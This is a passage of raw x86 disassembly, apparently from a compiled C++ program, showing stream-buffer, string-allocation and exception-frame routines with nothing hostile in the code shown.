  42bce2:	mov    ecx,DWORD PTR [eax+edi*1+0x28]
  42bce6:	mov    DWORD PTR [ebp-0x1c],ecx
  42bce9:	call   0x42b04a
  42bcee:	mov    DWORD PTR [ebp-0x18],eax
  42bcf1:	or     DWORD PTR [ebp-0x20],0xffffffff
  42bcf5:	cmp    eax,0xffffffff
  42bcf8:	jne    0x42bd16
  42bcfa:	mov    eax,DWORD PTR [edi]
  42bcfc:	mov    ecx,DWORD PTR [eax+0x4]
  42bcff:	add    ecx,edi
  42bd01:	mov    DWORD PTR [ebp-0x24],ecx
  42bd04:	mov    eax,DWORD PTR [ecx+0x8]
  42bd07:	mov    DWORD PTR [ebp-0x28],eax
  42bd0a:	push   ebx
  42bd0b:	or     eax,0x1
  42bd0e:	push   eax
  42bd0f:	call   0x42bbc4
  42bd14:	jmp    0x42bd59
  42bd16:	movzx  eax,al
  42bd19:	mov    ecx,DWORD PTR [esi+0x10]
  42bd1c:	test   BYTE PTR [ecx+eax*2],0x48
  42bd20:	je     0x42bd59
  42bd22:	mov    eax,DWORD PTR [edi]
  42bd24:	mov    eax,DWORD PTR [eax+0x4]
  42bd27:	mov    eax,DWORD PTR [eax+edi*1+0x28]
  42bd2b:	mov    DWORD PTR [ebp-0x2c],eax
  42bd2e:	push   eax
  42bd2f:	call   0x42b06e
  42bd34:	jmp    0x42bcee
  42bd36:	mov    eax,DWORD PTR [ebp+0x8]
  42bd39:	mov    ecx,DWORD PTR [eax]
  42bd3b:	mov    ecx,DWORD PTR [ecx+0x4]
  42bd3e:	add    ecx,eax
  42bd40:	mov    eax,DWORD PTR [ecx+0x8]
  42bd43:	push   0x1
  42bd45:	or     eax,0x4
  42bd48:	push   eax
  42bd49:	call   0x42bbc4
  42bd4e:	mov    eax,0x42bd54
  42bd53:	ret    
  42bd54:	xor    ebx,ebx
  42bd56:	mov    edi,DWORD PTR [ebp+0x8]
  42bd59:	or     DWORD PTR [ebp-0x4],0xffffffff
  42bd5d:	mov    eax,DWORD PTR [edi]
  42bd5f:	mov    eax,DWORD PTR [eax+0x4]
  42bd62:	lea    ecx,[eax+edi*1]
  42bd65:	cmp    DWORD PTR [ecx+0x8],ebx
  42bd68:	jne    0x42bd6e
  42bd6a:	mov    al,0x1
  42bd6c:	jmp    0x42bd7d
  42bd6e:	push   ebx
  42bd6f:	mov    eax,DWORD PTR [ecx+0x8]
  42bd72:	or     eax,0x2
  42bd75:	push   eax
  42bd76:	call   0x42bbc4
  42bd7b:	xor    al,al
  42bd7d:	mov    ecx,DWORD PTR [ebp-0xc]
  42bd80:	mov    DWORD PTR fs:0x0,ecx
  42bd87:	pop    edi
  42bd88:	pop    esi
  42bd89:	pop    ebx
  42bd8a:	leave  
  42bd8b:	ret    0x8
  42bd8e:	mov    eax,0x438086
  42bd93:	call   0x42f168
  42bd98:	sub    esp,0x20
  42bd9b:	push   ebx
  42bd9c:	push   esi
  42bd9d:	push   edi
  42bd9e:	mov    DWORD PTR [ebp-0x10],esp
  42bda1:	mov    edi,DWORD PTR [ebp+0x8]
  42bda4:	xor    ebx,ebx
  42bda6:	mov    DWORD PTR [ebp-0x14],ebx
  42bda9:	mov    DWORD PTR [edi+0x4],ebx
  42bdac:	mov    eax,edi
  42bdae:	lea    esi,[ebp-0x2c]
  42bdb1:	call   0x42be7e
  42bdb6:	push   0x1
  42bdb8:	push   DWORD PTR [ebp-0x2c]
  42bdbb:	call   0x42bc5e
  42bdc0:	mov    BYTE PTR [ebp-0x28],al
  42bdc3:	cmp    al,bl
  42bdc5:	je     0x42be41
  42bdc7:	cmp    DWORD PTR [ebp+0x10],ebx
  42bdca:	jle    0x42be41
  42bdcc:	mov    DWORD PTR [ebp-0x4],ebx
  42bdcf:	mov    eax,DWORD PTR [edi]
  42bdd1:	mov    eax,DWORD PTR [eax+0x4]
  42bdd4:	mov    ecx,DWORD PTR [eax+edi*1+0x28]
  42bdd8:	mov    DWORD PTR [ebp-0x1c],ecx
  42bddb:	call   0x42b04a
  42bde0:	mov    DWORD PTR [ebp-0x18],eax
  42bde3:	dec    DWORD PTR [ebp+0x10]
  42bde6:	cmp    DWORD PTR [ebp+0x10],ebx
  42bde9:	jle    0x42be41
  42bdeb:	or     DWORD PTR [ebp-0x20],0xffffffff
  42bdef:	cmp    eax,0xffffffff
  42bdf2:	jne    0x42bdfa
  42bdf4:	or     DWORD PTR [ebp-0x14],0x1
  42bdf8:	jmp    0x42be41
  42bdfa:	cmp    al,BYTE PTR [ebp+0x14]
  42bdfd:	je     0x42be41
  42bdff:	mov    ecx,DWORD PTR [ebp+0xc]
  42be02:	mov    BYTE PTR [ecx],al
  42be04:	inc    DWORD PTR [ebp+0xc]
  42be07:	inc    DWORD PTR [edi+0x4]
  42be0a:	mov    eax,DWORD PTR [edi]
  42be0c:	mov    eax,DWORD PTR [eax+0x4]
  42be0f:	mov    eax,DWORD PTR [eax+edi*1+0x28]
  42be13:	mov    DWORD PTR [ebp-0x24],eax
  42be16:	push   eax
  42be17:	call   0x42b06e
  42be1c:	jmp    0x42bde0
  42be1e:	mov    eax,DWORD PTR [ebp+0x8]
  42be21:	mov    ecx,DWORD PTR [eax]
  42be23:	mov    ecx,DWORD PTR [ecx+0x4]
  42be26:	add    ecx,eax
  42be28:	mov    eax,DWORD PTR [ecx+0x8]
  42be2b:	push   0x1
  42be2d:	or     eax,0x4
  42be30:	push   eax
  42be31:	call   0x42bbc4
  42be36:	mov    eax,0x42be3c
  42be3b:	ret    
  42be3c:	xor    ebx,ebx
  42be3e:	mov    edi,DWORD PTR [ebp+0x8]
  42be41:	or     DWORD PTR [ebp-0x4],0xffffffff
  42be45:	mov    eax,DWORD PTR [ebp-0x14]
  42be48:	cmp    DWORD PTR [edi+0x4],ebx
  42be4b:	jne    0x42be50
  42be4d:	or     eax,0x2
  42be50:	push   ebx
  42be51:	push   eax
  42be52:	mov    eax,DWORD PTR [edi]
  42be54:	mov    ecx,DWORD PTR [eax+0x4]
  42be57:	add    ecx,edi
  42be59:	call   0x42af0b
  42be5e:	mov    eax,DWORD PTR [ebp+0xc]
  42be61:	mov    BYTE PTR [eax],bl
  42be63:	lea    eax,[ebp-0x2c]
  42be66:	call   0x42b009
  42be6b:	mov    eax,edi
  42be6d:	mov    ecx,DWORD PTR [ebp-0xc]
  42be70:	mov    DWORD PTR fs:0x0,ecx
  42be77:	pop    edi
  42be78:	pop    esi
  42be79:	pop    ebx
  42be7a:	leave  
  42be7b:	ret    0x10
  42be7e:	mov    DWORD PTR [esi],eax
  42be80:	mov    ecx,DWORD PTR [eax]
  42be82:	mov    ecx,DWORD PTR [ecx+0x4]
  42be85:	mov    eax,DWORD PTR [ecx+eax*1+0x28]
  42be89:	test   eax,eax
  42be8b:	je     0x42be95
  42be8d:	lea    ecx,[eax+0x4]
  42be90:	call   0x42d434
  42be95:	mov    eax,esi
  42be97:	ret    
  42be98:	mov    eax,DWORD PTR [ecx+0x20]
  42be9b:	cmp    DWORD PTR [eax],0x0
  42be9e:	je     0x42bec0
  42bea0:	mov    edx,DWORD PTR [ecx+0x30]
  42bea3:	mov    eax,DWORD PTR [eax]
  42bea5:	mov    edx,DWORD PTR [edx]
  42bea7:	add    edx,eax
  42bea9:	cmp    eax,edx
  42beab:	jae    0x42bec0
  42bead:	mov    eax,DWORD PTR [ecx+0x30]
  42beb0:	dec    DWORD PTR [eax]
  42beb2:	mov    ecx,DWORD PTR [ecx+0x20]
  42beb5:	mov    eax,DWORD PTR [ecx]
  42beb7:	lea    edx,[eax+0x1]
  42beba:	mov    DWORD PTR [ecx],edx
  42bebc:	movzx  eax,BYTE PTR [eax]
  42bebf:	ret    
  42bec0:	mov    eax,DWORD PTR [ecx]
  42bec2:	jmp    DWORD PTR [eax+0x14]
  42bec5:	mov    eax,DWORD PTR [ecx+0x24]
  42bec8:	cmp    DWORD PTR [eax],0x0
  42becb:	push   esi
  42becc:	je     0x42bef1
  42bece:	mov    esi,DWORD PTR [ecx+0x34]
  42bed1:	mov    eax,DWORD PTR [eax]
  42bed3:	mov    esi,DWORD PTR [esi]
  42bed5:	add    esi,eax
  42bed7:	cmp    eax,esi
  42bed9:	jae    0x42bef1
  42bedb:	mov    eax,DWORD PTR [ecx+0x34]
  42bede:	dec    DWORD PTR [eax]
  42bee0:	mov    ecx,DWORD PTR [ecx+0x24]
  42bee3:	mov    eax,DWORD PTR [ecx]
  42bee5:	lea    esi,[eax+0x1]
  42bee8:	mov    DWORD PTR [ecx],esi
  42beea:	mov    BYTE PTR [eax],dl
  42beec:	movzx  eax,dl
  42beef:	pop    esi
  42bef0:	ret    
  42bef1:	mov    eax,DWORD PTR [ecx]
  42bef3:	movzx  edx,dl
  42bef6:	push   edx
  42bef7:	call   DWORD PTR [eax+0x4]
  42befa:	pop    esi
  42befb:	ret    
  42befc:	push   esi
  42befd:	mov    esi,ecx
  42beff:	call   0x42c30d
  42bf04:	and    DWORD PTR [esi+0x48],0x0
  42bf08:	push   0x0
  42bf0a:	push   DWORD PTR [esp+0xc]
  42bf0e:	mov    ecx,esi
  42bf10:	mov    DWORD PTR [esi],0x439260
  42bf16:	call   0x42c385
  42bf1b:	mov    eax,esi
  42bf1d:	pop    esi
  42bf1e:	ret    0x4
  42bf21:	push   ebp
  42bf22:	mov    ebp,esp
  42bf24:	cmp    DWORD PTR [esi+0x58],0x0
  42bf28:	jne    0x42bf74
  42bf2a:	push   DWORD PTR [ebp+0x10]
  42bf2d:	push   DWORD PTR [ebp+0xc]
  42bf30:	push   DWORD PTR [ebp+0x8]
  42bf33:	call   0x42d44b
  42bf38:	add    esp,0xc
  42bf3b:	test   eax,eax
  42bf3d:	je     0x42bf74
  42bf3f:	push   0x1
  42bf41:	push   eax
  42bf42:	mov    ecx,esi
  42bf44:	call   0x42c385
  42bf49:	mov    eax,DWORD PTR [esi+0x38]
  42bf4c:	mov    ecx,DWORD PTR [eax]
  42bf4e:	mov    DWORD PTR [ebp+0x10],ecx
  42bf51:	call   0x401130
  42bf56:	lea    eax,[ebp+0x10]
  42bf59:	push   eax
  42bf5a:	call   0x42c86d
  42bf5f:	pop    ecx
  42bf60:	push   eax
  42bf61:	mov    ecx,esi
  42bf63:	call   0x42c095
  42bf68:	lea    ecx,[ebp+0x10]
  42bf6b:	call   0x40119a
  42bf70:	mov    eax,esi
  42bf72:	jmp    0x42bf76
  42bf74:	xor    eax,eax
  42bf76:	pop    ebp
  42bf77:	ret    0xc
  42bf7a:	push   ebx
  42bf7b:	push   esi
  42bf7c:	mov    esi,ecx
  42bf7e:	xor    ebx,ebx
  42bf80:	cmp    DWORD PTR [esi+0x58],ebx
  42bf83:	je     0x42bfc2
  42bf85:	call   0x42bfc7
  42bf8a:	test   al,al
  42bf8c:	je     0x42bfc2
  42bf8e:	push   DWORD PTR [esi+0x58]
  42bf91:	call   0x42ea2e
  42bf96:	test   eax,eax
  42bf98:	pop    ecx
  42bf99:	jne    0x42bfc2
  42bf9b:	mov    ecx,esi
  42bf9d:	mov    BYTE PTR [esi+0x54],bl
  42bfa0:	mov    BYTE PTR [esi+0x4c],bl
  42bfa3:	call   0x42c343
  42bfa8:	mov    DWORD PTR [esi+0x58],ebx
  42bfab:	mov    eax,ds:0x464ea8
  42bfb0:	mov    DWORD PTR [esi+0x50],eax
  42bfb3:	mov    eax,ds:0x464ea8
  42bfb8:	mov    DWORD PTR [esi+0x40],eax
  42bfbb:	mov    DWORD PTR [esi+0x3c],ebx
  42bfbe:	mov    eax,esi
  42bfc0:	jmp    0x42bfc4
  42bfc2:	xor    eax,eax
  42bfc4:	pop    esi
  42bfc5:	pop    ebx
  42bfc6:	ret    
  42bfc7:	push   ebp
  42bfc8:	mov    ebp,esp
  42bfca:	sub    esp,0x20
  42bfcd:	push   ebx
  42bfce:	push   esi
  42bfcf:	mov    esi,ecx
  42bfd1:	xor    ebx,ebx
  42bfd3:	cmp    DWORD PTR [esi+0x3c],ebx
  42bfd6:	je     0x42c08f
  42bfdc:	cmp    BYTE PTR [esi+0x4c],bl
  42bfdf:	je     0x42c08f
  42bfe5:	mov    eax,DWORD PTR [esi]
  42bfe7:	push   0xffffffff
  42bfe9:	call   DWORD PTR [eax+0x4]
  42bfec:	push   ebx
  42bfed:	push   0x8
  42bfef:	lea    ecx,[ebp-0x20]
  42bff2:	call   0x42b9dd
  42bff7:	push   edi
  42bff8:	cmp    DWORD PTR [ebp-0x8],0x10
  42bffc:	mov    edx,DWORD PTR [ebp-0x1c]
  42bfff:	mov    eax,edx
  42c001:	jae    0x42c008
  42c003:	lea    eax,[ebp-0x1c]
  42c006:	mov    edx,eax
  42c008:	mov    ecx,DWORD PTR [esi+0x3c]
  42c00b:	mov    edi,DWORD PTR [ecx]
  42c00d:	lea    ebx,[ebp-0x4]
  42c010:	push   ebx
  42c011:	mov    ebx,DWORD PTR [ebp-0xc]
  42c014:	add    eax,ebx
  42c016:	push   eax
  42c017:	push   edx
  42c018:	lea    eax,[esi+0x50]
  42c01b:	push   eax
  42c01c:	call   DWORD PTR [edi+0x18]
  42c01f:	sub    eax,0x0
  42c022:	je     0x42c02f
  42c024:	dec    eax
  42c025:	je     0x42c033
  42c027:	dec    eax
  42c028:	dec    eax
  42c029:	jne    0x42c07c
  42c02b:	mov    bl,0x1
  42c02d:	jmp    0x42c07e
  42c02f:	mov    BYTE PTR [esi+0x4c],0x0
  42c033:	cmp    DWORD PTR [ebp-0x8],0x10
  42c037:	mov    eax,DWORD PTR [ebp-0x1c]
  42c03a:	jae    0x42c03f
  42c03c:	lea    eax,[ebp-0x1c]
  42c03f:	mov    edi,DWORD PTR [ebp-0x4]
  42c042:	sub    edi,eax
  42c044:	je     0x42c065
  42c046:	cmp    DWORD PTR [ebp-0x8],0x10
  42c04a:	mov    eax,DWORD PTR [ebp-0x1c]
  42c04d:	jae    0x42c052
  42c04f:	lea    eax,[ebp-0x1c]
  42c052:	push   DWORD PTR [esi+0x58]
  42c055:	push   0x1
  42c057:	push   edi
  42c058:	push   eax
  42c059:	call   0x42e85c
  42c05e:	add    esp,0x10
  42c061:	cmp    edi,eax
  42c063:	jne    0x42c07c
  42c065:	cmp    BYTE PTR [esi+0x4c],0x0
  42c069:	je     0x42c02b
  42c06b:	push   0x0
  42c06d:	push   0x8
  42c06f:	lea    ecx,[ebp-0x20]
  42c072:	call   0x42ba03
  42c077:	jmp    0x42bff8
  42c07c:	xor    bl,bl
  42c07e:	push   0x0
  42c080:	push   0x1
  42c082:	lea    ecx,[ebp-0x20]
  42c085:	call   0x42bb7b
  42c08a:	mov    al,bl
  42c08c:	pop    edi
  42c08d:	jmp    0x42c091
  42c08f:	mov    al,0x1
  42c091:	pop    esi
  42c092:	pop    ebx
  42c093:	leave  
  42c094:	ret    
  42c095:	push   esi
  42c096:	push   edi
  42c097:	mov    edi,DWORD PTR [esp+0xc]
  42c09b:	mov    eax,DWORD PTR [edi]
  42c09d:	mov    esi,ecx
  42c09f:	mov    ecx,edi
  42c0a1:	call   DWORD PTR [eax+0x4]
  42c0a4:	test   al,al
  42c0a6:	je     0x42c0ae
  42c0a8:	and    DWORD PTR [esi+0x3c],0x0
  42c0ac:	jmp    0x42c0d8
  42c0ae:	mov    ecx,esi
  42c0b0:	mov    DWORD PTR [esi+0x3c],edi
  42c0b3:	call   0x42c343
  42c0b8:	cmp    DWORD PTR [esi+0x48],0x0
  42c0bc:	jne    0x42c0d8
  42c0be:	push   0x1c
  42c0c0:	call   0x42d8d9
  42c0c5:	test   eax,eax
  42c0c7:	pop    ecx
  42c0c8:	je     0x42c0d3
  42c0ca:	mov    ecx,eax
  42c0cc:	call   0x42c162
  42c0d1:	jmp    0x42c0d5
  42c0d3:	xor    eax,eax
  42c0d5:	mov    DWORD PTR [esi+0x48],eax
  42c0d8:	pop    edi
  42c0d9:	pop    esi
  42c0da:	ret    0x4
  42c0dd:	push   esi
  42c0de:	mov    eax,edi
  42c0e0:	mov    esi,ebx
  42c0e2:	call   0x42be7e
  42c0e7:	mov    eax,DWORD PTR [edi]
  42c0e9:	mov    eax,DWORD PTR [eax+0x4]
  42c0ec:	add    eax,edi
  42c0ee:	cmp    DWORD PTR [eax+0x8],0x0
  42c0f2:	jne    0x42c102
  42c0f4:	mov    eax,DWORD PTR [eax+0x2c]
  42c0f7:	test   eax,eax
  42c0f9:	je     0x42c102
  42c0fb:	mov    esi,eax
  42c0fd:	call   0x42aecb
  42c102:	mov    eax,DWORD PTR [edi]
  42c104:	mov    eax,DWORD PTR [eax+0x4]
  42c107:	cmp    DWORD PTR [eax+edi*1+0x8],0x0
  42c10c:	pop    esi
  42c10d:	sete   al
  42c110:	mov    BYTE PTR [ebx+0x4],al
  42c113:	mov    eax,ebx
  42c115:	ret    
  42c116:	call   0x42d446
  42c11b:	test   al,al
  42c11d:	jne    0x42c126
  42c11f:	mov    eax,DWORD PTR [esi]
  42c121:	call   0x42c2ab
  42c126:	mov    eax,esi
  42c128:	jmp    0x42b009
  42c12d:	mov    eax,DWORD PTR [esp+0x10]
  42c131:	mov    ecx,DWORD PTR [esp+0x8]
  42c135:	mov    DWORD PTR [eax],ecx
  42c137:	mov    eax,DWORD PTR [esp+0x1c]
  42c13b:	mov    ecx,DWORD PTR [esp+0x14]
  42c13f:	push   0x3
  42c141:	mov    DWORD PTR [eax],ecx
  42c143:	pop    eax
  42c144:	ret    0x1c
  42c147:	push   0x3
  42c149:	pop    eax
  42c14a:	ret    0x10
  42c14d:	mov    eax,DWORD PTR [esp+0xc]
  42c151:	sub    eax,DWORD PTR [esp+0x8]
  42c155:	cmp    DWORD PTR [esp+0x10],eax
  42c159:	jae    0x42c15f
  42c15b:	mov    eax,DWORD PTR [esp+0x10]
  42c15f:	ret    0x10
  42c162:	push   esi
  42c163:	mov    esi,ecx
  42c165:	push   0x0
  42c167:	mov    DWORD PTR [esi+0x18],0xf
  42c16e:	call   0x42c231
  42c173:	mov    eax,esi
  42c175:	pop    esi
  42c176:	ret    
  42c177:	push   ebp
  42c178:	mov    ebp,esp
  42c17a:	push   esi
  42c17b:	push   edi
  42c17c:	mov    edi,DWORD PTR [ebp+0x8]
  42c17f:	push   edi
  42c180:	mov    esi,ecx
  42c182:	call   0x42c4ca
  42c187:	test   al,al
  42c189:	je     0x42c1a9
  42c18b:	cmp    DWORD PTR [esi+0x18],0x10
  42c18f:	jb     0x42c196
  42c191:	mov    eax,DWORD PTR [esi+0x4]
  42c194:	jmp    0x42c199
  42c196:	lea    eax,[esi+0x4]
  42c199:	push   DWORD PTR [ebp+0xc]
  42c19c:	sub    edi,eax
  42c19e:	push   edi
  42c19f:	push   esi
  42c1a0:	mov    ecx,esi
  42c1a2:	call   0x42ba63
  42c1a7:	jmp    0x42c1e0
  42c1a9:	push   0x0
  42c1ab:	push   DWORD PTR [ebp+0xc]
  42c1ae:	mov    ecx,esi
  42c1b0:	call   0x42c24d
  42c1b5:	test   al,al
  42c1b7:	je     0x42c1de
  42c1b9:	cmp    DWORD PTR [esi+0x18],0x10
  42c1bd:	jb     0x42c1c4
  42c1bf:	mov    eax,DWORD PTR [esi+0x4]
  42c1c2:	jmp    0x42c1c7
  42c1c4:	lea    eax,[esi+0x4]
  42c1c7:	push   DWORD PTR [ebp+0xc]
  42c1ca:	push   edi
  42c1cb:	push   eax
  42c1cc:	call   0x42da10
  42c1d1:	add    esp,0xc
  42c1d4:	push   DWORD PTR [ebp+0xc]
  42c1d7:	mov    ecx,esi
  42c1d9:	call   0x42c231
  42c1de:	mov    eax,esi
  42c1e0:	pop    edi
  42c1e1:	pop    esi
  42c1e2:	pop    ebp
  42c1e3:	ret    0x8
  42c1e6:	push   esi
  42c1e7:	push   edi
  42c1e8:	mov    edi,DWORD PTR [esp+0xc]
  42c1ec:	cmp    edi,0xffffffff
  42c1ef:	mov    esi,ecx
  42c1f1:	jne    0x42c1f8
  42c1f3:	call   0x42d3af
  42c1f8:	push   0x0
  42c1fa:	push   edi
  42c1fb:	mov    ecx,esi
  42c1fd:	call   0x42c24d
  42c202:	test   al,al
  42c204:	je     0x42c22a
  42c206:	cmp    DWORD PTR [esi+0x18],0x10
  42c20a:	jb     0x42c211
  42c20c:	mov    eax,DWORD PTR [esi+0x4]
  42c20f:	jmp    0x42c214
  42c211:	lea    eax,[esi+0x4]
  42c214:	push   DWORD PTR [esp+0x10]
  42c218:	push   edi
  42c219:	push   eax
  42c21a:	call   0x401000
  42c21f:	add    esp,0xc
  42c222:	push   edi
  42c223:	mov    ecx,esi
  42c225:	call   0x42c231
  42c22a:	pop    edi
  42c22b:	mov    eax,esi
  42c22d:	pop    esi
  42c22e:	ret    0x8
  42c231:	cmp    DWORD PTR [ecx+0x18],0x10
  42c235:	mov    eax,DWORD PTR [esp+0x4]
  42c239:	mov    DWORD PTR [ecx+0x14],eax
  42c23c:	jb     0x42c243
  42c23e:	mov    ecx,DWORD PTR [ecx+0x4]
  42c241:	jmp    0x42c246
  42c243:	add    ecx,0x4
  42c246:	mov    BYTE PTR [ecx+eax*1],0x0
  42c24a:	ret    0x4
  42c24d:	push   esi
  42c24e:	push   edi
  42c24f:	mov    edi,DWORD PTR [esp+0xc]
  42c253:	cmp    edi,0xfffffffe
  42c256:	mov    esi,ecx
  42c258:	jbe    0x42c25f
  42c25a:	call   0x42d3af
  42c25f:	cmp    DWORD PTR [esi+0x18],edi
  42c262:	jae    0x42c271
  42c264:	push   DWORD PTR [esi+0x14]
  42c267:	mov    ecx,esi
  42c269:	push   edi
  42c26a:	call   0x42c3d4
  42c26f:	jmp    0x42c29e
  42c271:	cmp    BYTE PTR [esp+0x10],0x0
  42c276:	je     0x42c292
  42c278:	cmp    edi,0x10
  42c27b:	jae    0x42c292
  42c27d:	mov    eax,DWORD PTR [esi+0x14]
  42c280:	cmp    edi,eax
  42c282:	jae    0x42c286
  42c284:	mov    eax,edi
  42c286:	push   eax
  42c287:	push   0x1
  42c289:	mov    ecx,esi
  42c28b:	call   0x42bb7b
  42c290:	jmp    0x42c29e
  42c292:	test   edi,edi
  42c294:	jne    0x42c29e
  42c296:	push   edi
  42c297:	mov    ecx,esi
  42c299:	call   0x42c231
  42c29e:	xor    eax,eax
  42c2a0:	cmp    eax,edi
  42c2a2:	sbb    eax,eax
  42c2a4:	pop    edi
  42c2a5:	neg    eax
  42c2a7:	pop    esi
  42c2a8:	ret    0x8
  42c2ab:	push   esi
  42c2ac:	mov    esi,eax
  42c2ae:	mov    eax,DWORD PTR [esi]
  42c2b0:	mov    eax,DWORD PTR [eax+0x4]
  42c2b3:	test   BYTE PTR [eax+esi*1+0x10],0x2
  42c2b8:	je     0x42c2bf
  42c2ba:	call   0x42aecb
  42c2bf:	pop    esi
  42c2c0:	ret    
  42c2c1:	push   ebx
  42c2c2:	push   esi
  42c2c3:	mov    esi,ecx
  42c2c5:	call   0x42cd78
  42c2ca:	mov    eax,DWORD PTR [esp+0xc]
  42c2ce:	xor    ebx,ebx
  42c2d0:	push   0x20
  42c2d2:	mov    ecx,esi
  42c2d4:	mov    DWORD PTR [esi+0x28],eax
  42c2d7:	mov    DWORD PTR [esi+0x2c],ebx
  42c2da:	call   0x42bbde
  42c2df:	cmp    DWORD PTR [esi+0x28],ebx
  42c2e2:	mov    BYTE PTR [esi+0x30],al
  42c2e5:	jne    0x42c2f6
  42c2e7:	mov    eax,DWORD PTR [esi+0x8]
  42c2ea:	push   ebx
  42c2eb:	or     eax,0x4
  42c2ee:	push   eax
  42c2ef:	mov    ecx,esi
  42c2f1:	call   0x42bbc4
  42c2f6:	cmp    BYTE PTR [esp+0x10],bl
  42c2fa:	je     0x42c305
  42c2fc:	mov    ecx,esi
  42c2fe:	call   0x42cae8
  42c303:	jmp    0x42c308
  42c305:	mov    DWORD PTR [esi+0x4],ebx
  42c308:	pop    esi
  42c309:	pop    ebx
  42c30a:	ret    0x8
  42c30d:	push   esi
  42c30e:	mov    esi,ecx
  42c310:	lea    ecx,[esi+0x4]
  42c313:	mov    DWORD PTR [esi],0x439228
  42c319:	call   0x42d407
  42c31e:	push   0x4
  42c320:	call   0x42d8d9
  42c325:	test   eax,eax
  42c327:	pop    ecx
  42c328:	je     0x42c333
  42c32a:	mov    ecx,eax
  42c32c:	call   0x42d26c
  42c331:	jmp    0x42c335
  42c333:	xor    eax,eax
  42c335:	mov    ecx,esi
  42c337:	mov    DWORD PTR [esi+0x38],eax
  42c33a:	call   0x42c343
  42c33f:	mov    eax,esi
  42c341:	pop    esi
  42c342:	ret    
  42c343:	lea    edx,[ecx+0x18]
  42c346:	mov    DWORD PTR [ecx+0x20],edx
  42c349:	lea    edx,[ecx+0x1c]
  42c34c:	mov    DWORD PTR [ecx+0x24],edx
  42c34f:	lea    edx,[ecx+0x28]
  42c352:	mov    DWORD PTR [ecx+0x30],edx
  42c355:	lea    eax,[ecx+0x8]
  42c358:	mov    DWORD PTR [ecx+0x10],eax
  42c35b:	lea    edx,[ecx+0x2c]
  42c35e:	mov    DWORD PTR [ecx+0x34],edx
  42c361:	xor    edx,edx
  42c363:	lea    eax,[ecx+0xc]
  42c366:	mov    DWORD PTR [ecx+0x14],eax
  42c369:	mov    DWORD PTR [eax],edx
  42c36b:	mov    eax,DWORD PTR [ecx+0x24]
  42c36e:	mov    DWORD PTR [eax],edx
  42c370:	mov    eax,DWORD PTR [ecx+0x34]
  42c373:	mov    DWORD PTR [eax],edx
  42c375:	mov    eax,DWORD PTR [ecx+0x10]
  42c378:	mov    DWORD PTR [eax],edx
  42c37a:	mov    eax,DWORD PTR [ecx+0x20]
  42c37d:	mov    DWORD PTR [eax],edx
  42c37f:	mov    eax,DWORD PTR [ecx+0x30]
  42c382:	mov    DWORD PTR [eax],edx
  42c384:	ret    
  42c385:	cmp    DWORD PTR [esp+0x8],0x1
  42c38a:	push   esi
  42c38b:	mov    esi,ecx
  42c38d:	sete   al
  42c390:	push   edi
  42c391:	mov    BYTE PTR [esi+0x54],al
  42c394:	mov    BYTE PTR [esi+0x4c],0x0
  42c398:	call   0x42c343
  42c39d:	mov    edi,DWORD PTR [esp+0xc]
  42c3a1:	test   edi,edi
  42c3a3:	je     0x42c3b8
  42c3a5:	lea    ecx,[edi+0x4]
  42c3a8:	push   ecx
  42c3a9:	push   edi
  42c3aa:	lea    eax,[edi+0x8]
  42c3ad:	push   eax
  42c3ae:	push   ecx
  42c3af:	push   edi
  42c3b0:	push   eax
  42c3b1:	mov    ecx,esi
  42c3b3:	call   0x42c4fe
  42c3b8:	mov    DWORD PTR [esi+0x58],edi
  42c3bb:	mov    eax,ds:0x464ea8
  42c3c0:	mov    DWORD PTR [esi+0x50],eax
  42c3c3:	mov    eax,ds:0x464ea8
  42c3c8:	and    DWORD PTR [esi+0x3c],0x0
  42c3cc:	pop    edi
  42c3cd:	mov    DWORD PTR [esi+0x40],eax
  42c3d0:	pop    esi
  42c3d1:	ret    0x8
  42c3d4:	mov    eax,0x438054
  42c3d9:	call   0x42f168
  42c3de:	sub    esp,0x14
  42c3e1:	push   ebx
  42c3e2:	push   esi
  42c3e3:	push   edi
  42c3e4:	mov    DWORD PTR [ebp-0x10],esp
  42c3e7:	mov    edi,ecx
  42c3e9:	mov    DWORD PTR [ebp-0x1c],edi
  42c3ec:	mov    esi,DWORD PTR [ebp+0x8]
  42c3ef:	or     esi,0xf
  42c3f2:	cmp    esi,0xfffffffe
  42c3f5:	jbe    0x42c3fc
  42c3f7:	mov    esi,DWORD PTR [ebp+0x8]
  42c3fa:	jmp    0x42c421
  42c3fc:	mov    ecx,DWORD PTR [edi+0x18]
  42c3ff:	mov    DWORD PTR [ebp-0x14],ecx
  42c402:	shr    DWORD PTR [ebp-0x14],1
  42c405:	mov    eax,esi
  42c407:	xor    edx,edx
  42c409:	push   0x3
  42c40b:	pop    ebx
  42c40c:	div    ebx
  42c40e:	mov    edx,DWORD PTR [ebp-0x14]
  42c411:	cmp    eax,edx
  42c413:	jae    0x42c421
  42c415:	push   0xfffffffe
  42c417:	pop    eax
  42c418:	sub    eax,edx
  42c41a:	cmp    ecx,eax
  42c41c:	ja     0x42c421
  42c41e:	lea    esi,[edx+ecx*1]
  42c421:	and    DWORD PTR [ebp-0x4],0x0
  42c425:	lea    eax,[esi+0x1]
  42c428:	push   eax
  42c429:	call   0x42d8d9
  42c42e:	pop    ecx
  42c42f:	mov    DWORD PTR [ebp-0x18],eax
  42c432:	jmp    0x42c45f
  42c434:	mov    DWORD PTR [ebp-0x10],esp
  42c437:	mov    eax,DWORD PTR [ebp+0x8]
  42c43a:	mov    DWORD PTR [ebp-0x20],eax
  42c43d:	mov    BYTE PTR [ebp-0x4],0x2
  42c441:	inc    eax
  42c442:	push   eax
  42c443:	call   0x42d8d9
  42c448:	pop    ecx
  42c449:	mov    DWORD PTR [ebp-0x18],eax
  42c44c:	mov    DWORD PTR [ebp-0x4],0x1
  42c453:	mov    eax,0x42c459
  42c458:	ret    
  42c459:	mov    edi,DWORD PTR [ebp-0x1c]
  42c45c:	mov    esi,DWORD PTR [ebp-0x20]
  42c45f:	or     DWORD PTR [ebp-0x4],0xffffffff
  42c463:	cmp    DWORD PTR [ebp+0xc],0x0
  42c467:	jbe    0x42c486
  42c469:	cmp    DWORD PTR [edi+0x18],0x10
  42c46d:	jb     0x42c474
  42c46f:	mov    eax,DWORD PTR [edi+0x4]
  42c472:	jmp    0x42c477
  42c474:	lea    eax,[edi+0x4]
  42c477:	push   DWORD PTR [ebp+0xc]
  42c47a:	push   eax
  42c47b:	push   DWORD PTR [ebp-0x18]
  42c47e:	call   0x42da10
  42c483:	add    esp,0xc
  42c486:	push   0x0
  42c488:	push   0x1
  42c48a:	mov    ecx,edi
  42c48c:	call   0x42bb7b
  42c491:	mov    eax,DWORD PTR [ebp-0x18]
